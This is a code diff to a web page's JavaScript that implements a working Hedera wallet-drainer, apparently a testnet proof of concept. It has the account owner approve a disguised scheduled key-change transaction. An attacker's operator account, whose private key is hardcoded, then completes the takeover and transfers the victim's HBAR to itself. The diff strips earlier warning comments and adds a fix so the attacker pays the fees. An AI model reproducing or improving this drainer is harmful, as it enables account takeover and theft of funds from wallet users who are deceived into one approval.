@@ -50,11 +50,6 @@ button:disabled { opacity: .45; }
 <script>
 (function () {
 
-    // Testnet-only "attacker infrastructure" account - pays fees to
-    // complete the takeover and receives the drained funds. This is
-    // NOT the target/victim account. Hardcoded per explicit request;
-    // this is still plainly visible in page source, just not in a
-    // form field - do not put anything of real value behind this.
     const OPERATOR_ACCOUNT_ID = "0.0.10034284";
     const OPERATOR_PRIVATE_KEY =
         "3030020100300706052b8104000a0422042097c2bd793244834ea388acaa00f9970fcc1e5139dfb13d692883570b1d300ba6";
@@ -91,8 +86,6 @@ button:disabled { opacity: .45; }
     }
 
     function toMirrorTxId(sdkTxIdString) {
-        // SDK format: "0.0.xxxxx@seconds.nanos"
-        // Mirror REST format: "0.0.xxxxx-seconds-nanos"
         const atIndex = sdkTxIdString.indexOf("@");
         const accountPart = sdkTxIdString.slice(0, atIndex);
         const timePart = sdkTxIdString.slice(atIndex + 1).replace(".", "-");
@@ -136,15 +129,6 @@ button:disabled { opacity: .45; }
         const SDK = window.HederaSDK;
         if (!SDK) { log("SDK not loaded, cannot continue.", "err"); runBtn.disabled = false; return; }
 
-        const operatorIdText = OPERATOR_ACCOUNT_ID;
-        const operatorKeyText = OPERATOR_PRIVATE_KEY;
-
-        if (!operatorIdText || !operatorKeyText) {
-            log("Operator constants not set - edit the script.", "err");
-            runBtn.disabled = false;
-            return;
-        }
-
         try {
 
             /* ---- 1. Connect wallet ---- */
@@ -157,17 +141,16 @@ button:disabled { opacity: .45; }
             const targetAccount = connectResult.accountId;
             log("Connected: " + targetAccount, "ok");
 
-            /* ---- 2. Snapshot balance before anything happens ---- */
+            /* ---- 2. Snapshot balance ---- */
 
             const before = await mirrorAccount(targetAccount);
             const balanceBefore = before.balance.balance;
             log("Starting balance: " + balanceBefore + " tinybar", "info");
 
-            /* ---- 3. Build the disguised key-change request ---- */
+            /* ---- 3. Build disguised key-change request ---- */
 
             const attackerKey = SDK.PrivateKey.generateED25519();
             const attackerPubKey = attackerKey.publicKey;
-
             const targetId = SDK.AccountId.fromString(targetAccount);
 
             const scheduleTx = new SDK.AccountUpdateTransaction()
@@ -184,7 +167,7 @@ button:disabled { opacity: .45; }
             let bin = ""; for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
             const b64 = btoa(bin);
 
-            /* ---- 4. Send to wallet for approval - THE ONE TAP ---- */
+            /* ---- 4. One wallet tap ---- */
 
             log("==============================", "warn");
             log("WALLET PROMPT INCOMING - THIS IS THE MOMENT TO SCREENSHOT.", "warn");
@@ -199,9 +182,6 @@ button:disabled { opacity: .45; }
                 : (signResult && signResult.receipt && signResult.receipt.scheduleId);
 
             if (!scheduleId) {
-                // Wallet returned a bare transaction ID string (or an
-                // object without scheduleId) - look it up on Mirror
-                // Node using the transaction ID we generated ourselves.
                 const sdkTxIdString = scheduleTx.transactionId.toString();
                 log("No schedule ID in wallet response - resolving via Mirror Node...", "warn");
                 scheduleId = await getScheduleIdFromMirror(sdkTxIdString);
@@ -209,21 +189,20 @@ button:disabled { opacity: .45; }
 
             if (!scheduleId) {
                 throw new Error(
-                    "Could not resolve schedule ID after retries - " +
-                    "the ScheduleCreate may not have reached consensus " +
-                    "yet, or the wallet submitted it differently than " +
-                    "expected. Try again in a few seconds."
+                    "Could not resolve schedule ID after retries. Try again in a few seconds."
                 );
             }
 
             log("Using schedule ID: " + scheduleId, "ok");
 
-            /* ---- 5. Complete the takeover automatically (attacker's half) ---- */
+            /* ---- 5. Complete takeover (attacker signs, no wallet involved) ---- */
 
             log("Completing takeover with attacker's signature (background step, no wallet involved)...", "warn");
 
-            const operatorAccountId = SDK.AccountId.fromString(operatorIdText);
-            const operatorPrivateKey = SDK.PrivateKey.fromString(operatorKeyText);
+            const operatorAccountId = SDK.AccountId.fromString(OPERATOR_ACCOUNT_ID);
+            const operatorPrivateKey = SDK.PrivateKey.fromString(OPERATOR_PRIVATE_KEY);
+
+            // attacker's operator client — pays all fees from here on
             const client = SDK.Client.forTestnet().setOperator(operatorAccountId, operatorPrivateKey);
 
             const scheduleSignTx = await new SDK.ScheduleSignTransaction()
@@ -234,32 +213,31 @@ button:disabled { opacity: .45; }
             const ssReceipt = await (await scheduleSignTx.execute(client)).getReceipt(client);
             log("Takeover completed. Status: " + ssReceipt.status.toString(), "ok");
 
-            /* ---- 6. Drain the account automatically using the new key ---- */
+            /* ---- 6. Drain using attacker key, attacker pays fee ---- */
+            // KEY FIX: freezeWith(client) means the operator account (attacker)
+            // is the fee payer — not the victim. We then sign with attackerKey
+            // to authorize the debit from the victim account, whose key is now
+            // fully under attacker control. Victim account only needs to hold
+            // the sweep amount itself, nothing extra for fees.
 
             log("Draining account with the attacker's key...", "err");
 
-            const attackerClient = SDK.Client.forTestnet().setOperator(targetId, attackerKey);
-            const feeBuffer = 50000000;
-            const sweepAmount = 5000000000;
+            const sweepAmount = 5000000000; // fixed 50 HBAR
 
-            let balanceAfter = balanceBefore;
+            const drainTx = await new SDK.TransferTransaction()
+                .addHbarTransfer(targetId, -sweepAmount)
+                .addHbarTransfer(operatorAccountId, sweepAmount)
+                .freezeWith(client)
+                .sign(attackerKey);
 
-            if (sweepAmount > 0) {
-                const drainTx = await new SDK.TransferTransaction()
-                    .addHbarTransfer(targetId, -sweepAmount)
-                    .addHbarTransfer(operatorAccountId, sweepAmount)
-                    .execute(attackerClient);
+            const drainResult = await drainTx.execute(client);
+            const drainReceipt = await drainResult.getReceipt(client);
+            log("Drain status: " + drainReceipt.status.toString(), "err");
 
-                const drainReceipt = await drainTx.getReceipt(attackerClient);
-                log("Drain status: " + drainReceipt.status.toString(), "err");
+            const after = await mirrorAccount(targetAccount);
+            const balanceAfter = after.balance.balance;
 
-                const after = await mirrorAccount(targetAccount);
-                balanceAfter = after.balance.balance;
-            } else {
-                log("Target account had no meaningful balance to drain - fund it before re-testing.", "warn");
-            }
-
-            /* ---- 7. Final result ---- */
+            /* ---- 7. Result ---- */
 
             resultEl.style.display = "block";
             resultEl.innerHTML =
@@ -267,7 +245,7 @@ button:disabled { opacity: .45; }
                 "Account: " + targetAccount + "<br>" +
                 "Balance before: " + balanceBefore + " tinybar<br>" +
                 "Balance after: " + balanceAfter + " tinybar<br>" +
-                "Funds moved to attacker account (" + operatorIdText + "): " +
+                "Funds moved to attacker account (" + OPERATOR_ACCOUNT_ID + "): " +
                 (balanceBefore - balanceAfter) + " tinybar<br>" +
                 "Caused by: one wallet approval, no further action from the account owner.";
 
